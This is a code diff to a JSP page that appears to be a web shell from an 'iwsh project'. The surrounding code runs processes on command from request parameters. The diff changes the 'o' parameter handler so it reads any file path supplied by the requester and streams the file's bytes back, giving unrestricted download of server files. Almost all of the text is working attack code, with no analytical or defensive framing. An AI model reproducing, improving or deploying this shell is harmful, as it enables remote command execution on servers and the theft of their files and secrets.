@@ -1,4 +1,5 @@
 <%@ page import="java.util.*,java.io.*"%>
+<%@ page import="java.io.InputStream, java.io.OutputStream, java.io.FileInputStream" %>
 
 <%/*
 *   Created by NumquamScire for iwsh project.
@@ -38,16 +39,25 @@ if (request.getParameter("o") != null || request.getParameter("i") != null || re
             int exitCode = process.waitFor();
         }
         if (request.getParameter("o") != null) {
-                BufferedReader reader = new BufferedReader(new FileReader(request.getParameter("o")));
-                char[] buffer = new char[1024];
+            String filePath = request.getParameter("o");
+
+            try {
+                FileInputStream fileInputStream = new FileInputStream(filePath);
+                OutputStream outputStream = response.getOutputStream();
+
+                byte[] buffer = new byte[1024];
                 int bytesRead;
 
-                while ((bytesRead = reader.read(buffer)) != -1) {
-                    out.print(new String(buffer, 0, bytesRead));
-                    out.flush();
-                    Thread.sleep(100); 
+                while ((bytesRead = fileInputStream.read(buffer)) != -1) {
+                    outputStream.write(buffer, 0, bytesRead);
+                    outputStream.flush();  // Flush after each chunk for real-time streaming
                 }
 
+                fileInputStream.close();
+                outputStream.close();
+            } catch (Exception e) {
+                response.setStatus(HttpServletResponse.SC_INTERNAL_SERVER_ERROR);
+            }
         }
         if (request.getParameter("s") != null) {
             String fi = request.getParameter("s");
@@ -70,8 +80,3 @@ if (request.getParameter("o") != null || request.getParameter("i") != null || re
         return;
 }
 %>
-
-
-
-
-
